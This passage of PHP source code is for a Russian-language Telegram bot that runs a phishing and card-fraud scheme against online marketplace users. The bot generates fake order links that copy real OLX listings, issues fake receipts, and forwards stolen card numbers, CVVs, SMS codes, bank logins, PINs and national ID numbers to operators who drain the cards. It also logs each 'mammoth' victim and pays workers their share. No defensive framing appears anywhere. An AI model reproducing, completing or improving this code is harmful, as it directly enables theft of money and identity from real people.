                                "title"=>$chat_channel->result->title, 
                                "invite_link"=>$chat_channel->result->invite_link
                            );

                            file_put_contents('./chanels.json',json_encode(array($bot_chanels)));
                        } 
                    }
        }
 
        if(strpos($post->message->text,'/myproductsshow')!==false){

            foreach($bot_config->countries as $k=>$v){
                $i=$i+1;
                $sect_keyboard[]= array("text" => $v->name,"callback_data" => "/myproductscountry_".$v->code);
                if(count($sect_keyboard)>=2){ 
                    $inline_keyboard[]=$sect_keyboard;
                    $sect_keyboard=[];
                } 
                if($i>2&&count($sect_keyboard)<2&&count((array)$bot_config->countries)==$i){ 
                    $inline_keyboard[]=$sect_keyboard;
                }
                
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери страну",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

        if(strpos($post->message->text,'/myproductscountry_')!==false){

            $country_code = explode("_",$post->message->text);
            $con->user->update_user($usr->chat_id,array("now_settings"=>''));
            $inline_keyboard=[];
            foreach($bot_config->countries->{$country_code[1]}->markets as $k=>$v){
                $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/myproductsmarket_1_".$country_code[1]."_".$k)); 
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери маркет",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  
        if(strpos($post->message->text,'/getproduct_')!==false){
            $cm_code = explode("_",$post->message->text);
            $product = (object)$con->products->get_product($cm_code[1]); 

            $inline_keyboard=[];
            $inline_keyboard[]= array(
                array("text" => "🔙 Назад","callback_data" => "/myproductsmarket_".$cm_code[2]."_".$cm_code[3]."_".$cm_code[4]),
                array("text" => "❌ Удалить", "callback_data"=>"/myproductsmarket_".$cm_code[2]."_".$cm_code[3]."_".$cm_code[4]."_deleteproduct_".$cm_code[1])
            ); 
            $inline_keyboard[]=array(
                array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id)
            );
            $inline_keyboard[]=array(
                array("text" => "💲 Изменить цену","callback_data" => "/changeprice_".$product->id)
            );

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML', 
                "disable_web_page_preview"=>true,
                'text' => "💎 ID: ".$cm_code[1]."\n🎁 Товар: ".$product->title."\n💰 Цена: ".$product->price." ".$product->currancy."\n🔗 Ссылка: ".$product->generate_link,   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }
        if(strpos($post->message->text,'/myproductsmarket_')!==false){
            $cm_code = explode("_",$post->message->text); 

            if(count($cm_code)>3&&$cm_code[4]=='deleteall'){
                $con->products->delete_products($usr->id);
            }
            if(count($cm_code)>3&&$cm_code[4]=="deleteproduct"){
                $con->products->delete_product($cm_code[5]);
            }

            $products = $con->products->get_products($usr->id,$cm_code[1]);
            $products_next = $con->products->get_products($usr->id,$cm_code[1]+1);

            
 
            $inline_keyboard=[]; 

            foreach($products as $k=>$v){
                $inline_keyboard[]= array(
                    array("text" => $v->id." | ".$v->price." | ".$v->title,"callback_data" => "/getproduct_".$v->id."_".$cm_code[1]."_".$cm_code[2]."_".$cm_code[3] )
                );
            }

            $inline_keyboard[]= array(
                array('text' => "<","callback_data" => "/myproductsmarket_".($cm_code[1]>0?$cm_code[1]-1:'1')."_".$cm_code[2]."_".$cm_code[3]),
                array("text" => "🔙 Отмена","callback_data" => "/myproductscountry_".$cm_code[2] ),
                array('text' => ">","callback_data" => "/myproductsmarket_".($cm_code[1]>0&&count($products_next)>0?$cm_code[1]+1:'1')."_".$cm_code[2]."_".$cm_code[3])
            ); 
            $inline_keyboard[]= array(
                array("text" => "🗑 Удалить все","callback_data" => "/delmproductsmarket_1_".$cm_code[2]."_".$cm_code[3] )
            );
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Для детальной информации нажми на товар",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
        }
        if(strpos($post->message->text,'/delmproductsmarket_')!==false){
            $cm_code = explode("_",$post->message->text);


            $inline_keyboard[]= array(
                array('text' => "✅ Да","callback_data" => "/myproductsmarket_1_".$cm_code[2]."_".$cm_code[3]."_deleteall"),
                array("text" => "❌ Нет","callback_data" => "/myproductsmarket_1_".$cm_code[2]."_".$cm_code[3] )
            ); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Вы действительно хотите удалить все продукты?",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
        }
        /*~~~Fish GEN~~~*/
        if(strpos($post->message->text,'/country_')!==false){

            $country_code = explode("_",$post->message->text);
            $con->user->update_user($usr->chat_id,array("now_settings"=>''));
            $inline_keyboard=[];
            foreach($bot_config->countries->{$country_code[1]}->markets as $k=>$v){
                $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/generate_".$country_code[1]."_".$k)); 
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Выбери маркет",   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

         if(strpos($post->message->text,'/generate_')!==false){

            $cm_code = explode("_",$post->message->text);
 
            $inline_keyboard=[]; 
            $inline_keyboard[]= array(array("text" => "🔙 Отмена","callback_data" => "/country_".$cm_code[1] )); 
             

            if($cm_code[2]=='olx'){
                //.$bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]}
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);  
                $market = $bot_config->countries->{$cm_code[1]}->markets->{$cm_code[2]};
                $now_settings = array(
                    'step'=>1,
                    'market'=>$cm_code[2],
                    'countries'=>$cm_code[1],
                    'pid'=>NULL
                ); 
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)$now_settings)));
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'message_id' => $post->message->message_id,   
                    'parse_mode'=>'HTML',
                    'text' => "Пришли ссылку на товар сайта ".$market->domain.($market->example!=null?"\n(пример: ".$market->example:')'),
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }

            
 
        }    

        if(strpos($post->message->text,'https://')!==false&&$usr->now_settings!=''){
            $usr->now_settings = unserialize($usr->now_settings);
            if($usr->now_settings->step==1){ 
                
                $page = file_get_contents($post->message->text);
                preg_match_all('/window\.__PRERENDERED_STATE__= "(.*)";/U', $page, $matches);
                $matches = stripcslashes($matches[1][0]);
                $matches = json_decode($matches);

                file_put_contents('./log.txt',json_encode($matches)."\n\n"); 
                
               $p = $con->products->add_product(array(
                    'uid'       =>  $usr->id,
                    'title'     =>  $matches->ad->ad->title,
                    'price'     =>  $matches->ad->ad->price->regularPrice->value,
                    'currancy'  =>  $matches->ad->ad->price->regularPrice->currencyCode,
                    'link'      =>  $matches->ad->ad->url,
                    'img'       =>  $matches->ad->ad->photos[0],
                    'country'   =>  $usr->now_settings->countries,
                    'market'   =>  $usr->now_settings->market,
                )); 
                $usr->now_settings->step=2;
                $usr->now_settings->pid=$p['id'];
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings))); 

                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи адрес доставки"
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }

            
        }
        if($post->message->text!=''&&$usr->now_settings!=''){
            $usr->now_settings = unserialize($usr->now_settings);
            if($usr->now_settings->step==2){
                $usr->now_settings->step=3;
                $con->user->update_user($usr->chat_id,array("now_settings"=>serialize($usr->now_settings)));
                
                $con->products->update_product($usr->now_settings->pid,array('address'=>$post->message->text));
                
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    'text' => "Введи имя получателя (Пример: Иванов Иван)"
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                exit();
            }
            if($usr->now_settings->step==3||$usr->now_settings->step==4){ 

                if($usr->now_settings->step==4){
                    if (preg_match('/^[0-9.]+$/i', $post->message->text)){
                        $con->products->update_product($usr->now_settings->pid,array('price'=>$post->message->text));
                    }else{
                        $data = [
                            'chat_id' => $post->message->chat->id, 
                            'parse_mode'=>'HTML',
                            'text' => "Ты можешь вводить только цифры?"
                        ];  
                        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                        exit();
                    }
                }
                $product = (object)$con->products->get_product($usr->now_settings->pid);

                if(!$product->generate_link){
                    $generate_link = $bot_config->countries->{$usr->now_settings->countries}->markets->{$usr->now_settings->market}->fish."/order/".$usr->now_settings->pid;

                    $con->products->update_product($usr->now_settings->pid,array('mamont_name'=>$post->message->text,'generate_link'=>$generate_link));
                    $product->generate_link=$generate_link;
                }
                $con->user->update_user($usr->chat_id,array("now_settings"=>'')); 

                $inline_keyboard=[];
                if($bot_config->countries->{$product->country}->markets->{$product->market}->check){
                    $inline_keyboard[]=array(
                        array("text" => "✅ Получить чек","callback_data" => "/get_check_".$product->id),
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }else{
                    $inline_keyboard[]=array(
                        array("text" => "Изменить цену","callback_data" => "/changeprice_".$product->id)
                    );
                }
                $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back"));

                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard);   
                $data = [
                    'chat_id' => $post->message->chat->id, 
                    'parse_mode'=>'HTML',
                    "disable_web_page_preview"=>true,
                    'text' => "📦 Товар: ".$product->title."\n💲 Стоимость: ".$product->price." ".$product->currancy."\n\n✅ Готово! Удачной работы:)\n\n🔗 Ссылка: ".$product->generate_link,
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                exit();
            } 
            
        } 
        if(strpos($post->message->text,'/changeprice_')!==false){

            $changeprice = explode("_",$post->message->text); 
            $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)array('step'=>4,'pid'=>$changeprice[1])))); 

            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Ведите новую цену"
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

        if(strpos($post->message->text,'/get_check_')!==false){

            $check = explode("_",$post->message->text);  

            $product = (object)$con->products->get_product($check[2]);//
            $gen_check = 'https://'.$_SERVER['HTTP_HOST'].'/c.php?s='.$product->price.'&c='.$product->currancy;
            /*$data = [
                'chat_id' => $post->message->chat->id,   
                'parse_mode'=>'HTML',
                'text' => $gen_check
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); */
            $data = [
                'chat_id' => $post->message->chat->id, 
                'photo'=>$gen_check
            ];    

            file_get_contents($urlApi.$key.'/sendPhoto?'.http_build_query($data));

        }  

        
        if(strpos($post->message->text,'/set_log_')!==false){


            $data_log = explode("_",$post->message->text); 

            $product = (object)$con->products->get_product($data_log[3]);
            $card = (object)$con->user->get_card($data_log[4]); 
            $worker = (object)$con->user->get_user_byid($product->uid);
            $chat_id = $worker->chat_id;

            $con->user->update_card($data_log[4],array("vbiv_status"=>$data_log[2])); 

            if($card->vbid!=$post->from->id){ return false;}

             if($data_log[2]=='3ds'){
                $text = 'У мамонтёнка отключён 3Ds';
            }elseif($data_log[2]=='limit'){
                $text = 'У мамонтёнка на карте лимит';
            }elseif($data_log[2]=='fake'){
                $text = 'Мамонтёнок ввел не верные данные карты';
            }elseif($data_log[2]=='reject'){
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ".$card->bank_haslo;
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ".$card->bank_pin;
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ".$card->bank_pesel;
                }
                if($card->bank_nmatki){
                    $banking .= "\n💳 <b>Ф. матери</b>: ".$card->bank_nmatki;
                } 
                if($card->bank_nojca){
                    $banking .= "\n💳 <b>Ф. отца</b>: ".$card->bank_nojca;
                }  
                $text = "🔙 💳 Вбивер отдал карту ⚠️\n\n📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость товара</b>: ".$product->price." ".$product->currancy."\n📬 <b>Номер карты</b>: ".$card->number."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n✉️ <b>SMS</b>: ".$card->sms." 👈\n📬 <b>Имя держателя</b>: ".$card->card_name."\n📬 <b>Срок карты</b>: ".$card->month."/".$card->year."\n📬 <b>CVV</b>: ".$card->cvv."".$banking."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n";
            }elseif($data_log[2]=='ok'){ 
                $data = [
                    'chat_id' => $post->message->chat->id,
                    'message_id' => $post->message->message_id,
                    'parse_mode'=>'HTML',
                    'text' => "❌ Лог бьет @".$post->from->username."⚠️\n\n📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость товара</b>: ".$product->price." ".$product->currancy."\n📬 <b>Номер карты</b>: ".$card->number."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n".($card->sms?"✉️ <b>SMS</b>: ".$card->sms." 👈":"")."\n\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n <b>Введите сумму успеха в гривнах</b>\n             👇👇👇"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            if($data_log[2]!='ok'){
                $data = [
                    'chat_id' => $chat_id,
                    'parse_mode'=>'HTML',
                    'text' => $text
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));  
            }
        }  

        

        
        if(strpos($post->message->text,'/vwork_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'Log')!==false||strpos($post->message->chat->title,'Лог')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = explode(",",$usert);

            if($usert){ 
                
                if($usert->is_vbiver){ 
                    
                    $cou = array();
                    foreach($countrys as $v){
                        if($v!=$check[1]){
                            $cou[]=$v;
                        }
                    }
                    $con->user->update_user($post->message->from->id,array('is_vbiver'=>(count($cou)>0?1:NULL),'vbiv_country'=>implode(",",$cou)));
                    
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на вбиве в '.$bot_config->countries->{$check[1]}->name
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                }else{ 
                    
                    $countrys[]=$check[1];

                    $con->user->update_user($post->message->from->id,array('is_vbiver'=>1,'vbiv_country'=>implode(",",$countrys)));
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на вбиве в'.$bot_config->countries->{$check[1]}->name
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_'.$check[1]}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на вбиве в'.$bot_config->countries->{$check[1]}->name
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
            }  
        }

        if(strpos($post->message->text,'/vbivers')!==false){
            
            $vbt = '';

            foreach($bot_config->countries as $kc=>$vc){
                $vbivers = $con->user->get_vbivers($kc);
                $vbt .= $vc->flag.' на вбиве';
                if(count($vbivers)>0){
                    foreach($vbivers as $v){ 
                        $vbt .= ' @'.$v->login.', ';
                    }
                }else{
                    $vbt .=' никого нет';
                }
               $vbt .="\n";
            }
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => $vbt
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }

        if(strpos($post->message->text,'/stat')!==false){
            
            $summ_today = $con->user->get_stat_summ_today();
            $count_today = $con->user->get_stat_count_today();
            $sum_yestotay = $con->user->get_stat_summ_yestoday();
             
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => "📊 <b>Статистика за сегодня</b> 📊\n🐘 Залетов: <b>".$count_today."</b>\n💰 На сумму: <b>".($summ_today?$summ_today:0)." грн</b>\n\n💸 Вчера: <b>".($sum_yestotay?$sum_yestotay:0)." грн</b>\n"
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }

        if(strpos($post->message->text,'/mestat')!==false){
            

            $txtx = '';
            foreach($bot_config->countries as $k=>$v){

                $summ_all = $con->user->get_stat_summ_all($usr->id,$k);
                $count_all = $con->user->get_stat_count_all($usr->id,$k);
                $summ_today = $con->user->get_stat_summ_today($usr->id,$k);

                $txtx .= "<b>".$v->name."</b>\n";
                $txtx .= "💰 <b>Всего заработано:</b> ".($summ_all?$summ_all:0)." UAH\n";
                $txtx .= "🐘 <b>Всего залетов:</b> ".($count_all?$count_all:0)."\n";
                $txtx .= "💸 <b>Сегодня заработано:</b> ".($summ_today?$summ_today:0)." UAH\n\n";
                //$txtx .= "📊 <b>Место в топе:</b> \n\n";

            }
 
             
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => $txtx
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }
        
        if(strpos($post->message->text,'/deleteviplta_')!==false){
            $check = explode("_",$post->message->text); 
            
            $con->user->update_card($check[1],array('status_viplat'=>1)); 
             
        }
        if(strpos($post->message->text,'/successviplta_')!==false){
            $check = explode("_",$post->message->text); 
            
            $con->user->update_card($check[1],array('status_viplat'=>2)); 
        }
        if(strpos($post->message->text,'/successviplta_')!==false||strpos($post->message->text,'/deleteviplta_')!==false){
            $check = explode("_",$post->message->text);
            $card = $con->user->get_card($check[1]);
            $product = (object)$con->products->get_product($card->pid); 
            $worker = (object)$con->user->get_user_byid($product->uid); 
 
            $data = [
                'chat_id' => $card->vbid,  
                'parse_mode'=>'HTML',
                'message_id'=>$post->message->message_id,
                'text' => "💸 <b>Залет</b>: #".$card->id."\n <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n👨‍💻 <b>Воркер</b>: @".$worker->login."\n🦹‍♂️ <b>Вбивер</b>: @".$card->vblogin."\n\n✅ Обработано ".($card->status_viplat==1?"[Удалено]":"[Выплачено]")."\n"
            ];      
            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data)); 
            
            
             $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id,  
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        }


        if(strpos($post->message->text,'/get_log_')!==false){

            $check = explode("_",$post->message->text);  

            $product = (object)$con->products->get_product($check[2]);
            //$card_active = $con->user->get_card_ok();
            $card = (object)$con->user->get_card($check[3]); 
            $worker = (object)$con->user->get_user_byid($product->uid); 

            /* if($card_active){
                $data = [
                    'chat_id' => $post->message->chat->id,
                    'parse_mode'=>'HTML',
                    'text' => '@'.$card->vblogin.' у Вас уже есть активные вбивы, завершите сначала их!'.json_encode($card)
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                exit();
            } */

            
            
             
            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$check[2]."_".$check[3]); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$check[2]."_".$check[3]);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$check[2]."_".$check[3]);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$check[2]."_".$check[3]);
            $btn5 = array("text" => "✅ Успех","callback_data" => "/set_log_ok_".$check[2]."_".$check[3]);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5]]; 
                
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
 
            $con->user->update_card($check[3],array('vbid'=>$post->from->id,'vblogin'=>$post->from->username)); 

            $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ****";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ****";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ****";
                } 

            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id'=>$post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог бьет @".$post->from->username."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n".($card->sms?"✉️ <b>SMS</b>: ".$card->sms." 👈":"")."\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n"
            ]; 
            //file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));  

            $data['reply_markup']=$replyMarkup;
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
             
            $banking = '';
            if($card->bank_login){
                $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
            }
            if($card->bank_haslo){
                $banking .= "\n💳 <b>Haslo</b>: ".$card->bank_haslo;
            }
            if($card->bank_pin){
                $banking .= "\n💳 <b>Pin</b>: ".$card->bank_pin;
            }
            if($card->bank_pesel){
                $banking .= "\n💳 <b>Pesel</b>: ".$card->bank_pesel;
            }
            if($card->bank_nmatki){
                $banking .= "\n💳 <b>Ф. матери</b>: ".$card->bank_nmatki;
            } 
            if($card->bank_nojca){
                $banking .= "\n💳 <b>Ф. отца</b>: ".$card->bank_nojca;
            } 
            $data = [
                'chat_id' => $post->from->id,
                'parse_mode'=>'HTML',
                'text' => "💳 Данные из лога ⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ".$card->cvv.$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n"
            ]; 
            
   

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

        } 

        if($post->message->reply_to_message&&strpos($post->message->reply_to_message->text,'Token:')!==false){
            preg_match_all('/Token\:(.*)\n/U', $post->message->reply_to_message->text, $matches);
            $data = [
                'chat_id' => $post->message->chat->id,
                'message_id'=>$post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => "🟢 Сообщение доставлено!"
            ]; 
            
            $con->products->add_message(array(
                'token'=>$matches[1][0],
                'message'=>$post->message->text,
                'sender'=>'t',
                'chat_id'=>$post->message->chat->id
            )); 
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }

        if (preg_match('/^[0-9.]+$/i', $post->message->text)&&intval($post->message->text)>0){
            $message_id = intval($post->message->message_id);
            $card = (object)$con->user->get_card_ok(); 
            if(!$card){ return false;}
            $product = (object)$con->products->get_product($card->pid);
            $worker = (object)$con->user->get_user_byid($product->uid); 

            //file_put_contents('./log.txt',json_encode($message_id)."\n\n");
            $summ_vbiv = $post->message->text;
            $summ_vbiv_n = $summ_vbiv*20/100;
            $summ_vbiv = $summ_vbiv-$summ_vbiv_n;

            $card_ss = $con->user->get_card($card->id);
            
            //if(!$card_ss->vbiv_success_summ){
            
                $con->user->update_card($card->id,array('vbiv_success_summ'=>$summ_vbiv,'vbiv_status'=>'success_ok')); 
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ****";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ****";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ****";
                } 
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'parse_mode'=>'HTML',
